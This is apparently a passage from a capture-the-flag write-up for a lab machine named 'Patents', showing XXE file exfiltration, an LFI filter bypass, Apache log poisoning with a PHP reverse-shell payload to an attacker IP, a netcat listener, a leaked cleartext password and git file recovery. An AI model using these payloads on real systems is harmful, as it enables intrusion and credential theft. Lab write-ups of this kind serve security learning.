+<span class="mf">10.10.10.173</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">16</span><span class="o">/</span><span class="n">May</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">14</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">58</span><span class="p">]</span> <span class="s">"GET /dtd.xml?cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpnYnlvbG86eDoxMDAwOjEwMDA6Oi9ob21lL2dieW9sbzovYmluL2Jhc2gK HTTP/1.0"</span> <span class="mi">200</span> <span class="o">-</span>
+</code></pre></div></div>
+
+<p>decoded that base64 text and got the <code class="highlighter-rouge">/etc/passwd</code> data.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">gr4n173</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">echo</span> <span class="s">"cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpnYnlvbG86eDoxMDAwOjEwMDA6Oi9ob21lL2dieW9sbzovYmluL2Jhc2gK"</span> <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">d</span>
+<span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="n">daemon</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="n">daemon</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="nb">bin</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">sys</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="n">sys</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">sync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">sync</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sync</span>
+<span class="n">games</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">man</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">6</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">lp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="n">lp</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">lpd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">mail</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">news</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">uucp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">proxy</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="n">proxy</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">backup</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="n">backup</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">backups</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="nb">list</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="n">Mailing</span> <span class="n">List</span> <span class="n">Manager</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="nb">list</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">irc</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">gnats</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="n">Gnats</span> <span class="n">Bug</span><span class="o">-</span><span class="n">Reporting</span> <span class="n">System</span> <span class="p">(</span><span class="n">admin</span><span class="p">):</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">gnats</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">nobody</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">nobody</span><span class="p">:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">_apt</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">100</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">gbyolo</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="p">::</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">gbyolo</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+</code></pre></div></div>
+<p>This way I can see the user <code class="highlighter-rouge">www-data</code>and <code class="highlighter-rouge">gbyolo</code> shell. Now I had to poison the LFI server to get the shell.</p>
+
+<h1 id="lfi-to-www-data">LFI to www-data</h1>
+
+<p>As I got <code class="highlighter-rouge">/getPatent_alphav1.0.php</code> dir I checked that dir and got this as output.</p>
+
+<p><img src="/public/images/get_alpa_patents.jpg" alt="alpha_patents" /></p>
+
+<p>This indicated that, there was <code class="highlighter-rouge">?id</code> parameter which saved my time to find a parameter for <code class="highlighter-rouge">LFI</code> vulnerability. Now I used that parameter and able to see the <code class="highlighter-rouge">patents items</code> of admin user. But I tried the every possible way to find the <code class="highlighter-rouge">LFI</code> and at last I got the clue. As I enter <code class="highlighter-rouge">1</code> as value in parameter I can see the details of the patents item. Likewise I tried with <code class="highlighter-rouge">../1</code> which was basic dir to find the <code class="highlighter-rouge">LFI</code> and got the same patents item output.</p>
+
+<p><img src="/public/images/lfi_checking_patents.png" alt="patents_lfi" /></p>
+
+<p>This indicated that using <code class="highlighter-rouge">../</code> doesn’t make sense so I had to try that again i.e. <code class="highlighter-rouge">....//</code> as there there <code class="highlighter-rouge">5</code> patents items. I used that 5 times to see if I can access the <code class="highlighter-rouge">/etc/passwd</code> file
+as <code class="highlighter-rouge">?id=....//....//....//....//....//etc/passwd</code> .</p>
+
+<p><img src="/public/images/lfi_patents_exploited.jpg" alt="lfi_exploit" /></p>
+
+<p>Nice this way I got the LFI vulnerability and now I had to poison it to get the <code class="highlighter-rouge">RCE</code>. Then I tried looking for <code class="highlighter-rouge">/var/log/apache.log</code> file to see if I can access that file so that I can poison it but that didn’t worked. So we have to use  <code class="highlighter-rouge">/proc/self/fd/{number}</code> dir where we can access the log file if incase we was unable to access <code class="highlighter-rouge">apache.log</code> file.
+Now to find the <code class="highlighter-rouge">number</code> I used the <code class="highlighter-rouge">burpsuite</code> to bruteforce and found the <code class="highlighter-rouge">number=2</code> which gave <code class="highlighter-rouge">200</code> response.</p>
+
+<p><img src="/public/images/proc_self_patents.jpg" alt="proc_self" /></p>
+
+<p>This way I can access the log file so I tried poisoning it for that I used with listner on.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">gr4n173</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">curl</span> <span class="o">--</span><span class="n">referer</span> <span class="s">"&lt;?php exec(</span><span class="se">\"</span><span class="s">/bin/bash -c 'bash -i &gt; /dev/tcp/10.10.14.32/1337 0&gt;&amp;1'</span><span class="se">\"</span><span class="s">); ?&gt;"</span>  <span class="s">"http://patents.htb/getPatent_alphav1.0.php/?id=....//....//....//....//....//....//....//proc//self//fd//2"</span>
+</code></pre></div></div>
+
+<p><strong>Listner On:</strong></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">gr4n173</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">1337</span>
+<span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="nb">any</span><span class="p">]</span> <span class="mi">1337</span> <span class="o">...</span>                                                                                                                           
+<span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.10.14.187</span><span class="p">]</span> <span class="k">from</span> <span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.10.10.173</span><span class="p">]</span> <span class="mi">57008</span>                                           
+<span class="n">whoami</span>                                                                                                                                                
+<span class="n">www</span><span class="o">-</span><span class="n">data</span>                                                                                                                                              
+<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">"import pty;pty.spawn('/bin/bash')"</span>                                                                                                         
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">d9cf3b2a6944</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">docx2pdf</span><span class="err">$</span>
+</code></pre></div></div>
+<p>This way I got the <code class="highlighter-rouge">www-data</code> shell. You can learn more about LFI Poisoning <a href="https://www.hackingarticles.in/apache-log-poisoning-through-lfi/">here</a>.</p>
+
+<h1 id="www-data-to-user">Www-data to User</h1>
+
+<p>As I got the www-data shell first thing I will try is using <code class="highlighter-rouge">linEnum.sh</code> and <code class="highlighter-rouge">pspy64</code> to see the files and command that was used  . Then from the <code class="highlighter-rouge">pspy64</code> output I got the creds of user <code class="highlighter-rouge">gbyolo</code> user and I was able to login into the shell.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">d9cf3b2a6944</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="err">$</span><span class="o">./</span><span class="n">pspy64</span>
+<span class="o">.....</span>
+<span class="o">......</span>
+<span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">c</span> <span class="n">env</span> <span class="n">PASSWORD</span><span class="o">=</span><span class="s">"!gby0l0r0ck$$!"</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">checker_client</span><span class="o">/</span><span class="n">run_file</span><span class="o">.</span><span class="n">sh</span>  <span class="mi">2</span>
+<span class="n">python</span> <span class="n">checker</span><span class="o">.</span><span class="n">py</span> <span class="mf">10.100.0.1</span><span class="p">:</span><span class="mi">8888</span> <span class="n">lfmserver_user</span> <span class="n">PASSWORD</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">docx2pdf</span><span class="o">/</span><span class="n">convert</span><span class="o">.</span><span class="n">php</span> 
+</code></pre></div></div>
+
+<p>This way I got the root container and <code class="highlighter-rouge">user.txt</code> flag.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">d9cf3b2a6944</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="err">$</span> <span class="n">su</span> <span class="o">-</span><span class="n">i</span> <span class="n">gbyolo</span>
+<span class="n">Password</span><span class="p">:</span><span class="err">!</span><span class="n">gby0l0r0ck</span><span class="err">$$!</span>
+<span class="n">root</span><span class="o">@</span><span class="mi">2</span><span class="n">ca604911b14</span><span class="p">:</span><span class="c1"># whoami 
+</span><span class="n">gbyolo</span>
+<span class="n">root</span><span class="o">@</span><span class="mi">2</span><span class="n">ca604911b14</span><span class="p">:</span><span class="c1">#cat user.txt
+</span><span class="mi">0</span><span class="n">afdf89</span><span class="o">***************</span>
+</code></pre></div></div>
+<p>This way I got the user shell and flag.</p>
+
+<h1 id="root">Root</h1>
+
+<p>As soon as I got the root container I checked every part of the shell and got the dir <code class="highlighter-rouge">/opt/checker_client</code> and <code class="highlighter-rouge">/opt/checker_runned</code> besides these dir I found initialization folder of  <code class="highlighter-rouge">.git</code> inside <code class="highlighter-rouge">/usr/src/</code> directory. So I check <code class="highlighter-rouge">git log</code>. To learn more about git commands visit <a href="https://git-scm.com/">here</a>.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="o">@</span><span class="mi">2</span><span class="nx">ca604911b14</span><span class="o">:/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">src</span><span class="o">/</span><span class="nx">lfm</span><span class="c1"># git log --diff-filter=D --summary | grep delete</span>
+<span class="o">&lt;</span><span class="nx">it</span><span class="c1"># git log --diff-filter=D --summary | grep delete</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nx">README</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100755</span> <span class="nx">lfmserver</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nx">Makefile</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nx">README</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nx">arg_parsing</span><span class="o">.</span><span class="nx">c</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nx">arg_parsing</span><span class="o">.</span><span class="nx">h</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nb">file</span><span class="o">.</span><span class="nx">c</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nb">file</span><span class="o">.</span><span class="nx">h</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nx">files</span><span class="o">/</span><span class="k">try</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nx">lfm</span><span class="o">.</span><span class="nx">c</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nx">lfm</span><span class="o">.</span><span class="nx">h</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nx">lfmserver</span><span class="o">.</span><span class="nx">c</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nx">lfmserver</span><span class="o">.</span><span class="nx">conf</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nx">lfmserver</span><span class="o">.</span><span class="nx">h</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nb">log</span><span class="o">.</span><span class="nx">c</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nb">log</span><span class="o">.</span><span class="nx">h</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nb">md5</span><span class="o">.</span><span class="nx">c</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nb">md5</span><span class="o">.</span><span class="nx">h</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nx">params_parsing</span><span class="o">.</span><span class="nx">c</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nx">params_parsing</span><span class="o">.</span><span class="nx">h</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nx">process</span><span class="o">.</span><span class="nx">c</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nx">process</span><span class="o">.</span><span class="nx">h</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nx">socket_io</span><span class="o">.</span><span class="nx">c</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nx">socket_io</span><span class="o">.</span><span class="nx">h</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nx">thread</span><span class="o">.</span><span class="nx">c</span>
+ <span class="nb">delete</span> <span class="nx">mode</span> <span class="mi">100644</span> <span class="nx">thread</span><span class="o">.</span><span class="nx">h</span>
+</code></pre></div></div>
+<p>From here I got the deleted files so I recovered this files by compressing the file as tar and encoding to base64 and then copied to the localhost.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@2ca604911b14:/usr/src/lfm# tar cvzf repo.tar .git/
+root@2ca604911b14:/usr/src/lfm# cat repo.tar | base64 &gt; file.txt
+root@2ca604911b14:/usr/src/lfm# cat file.txt
+.......
+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
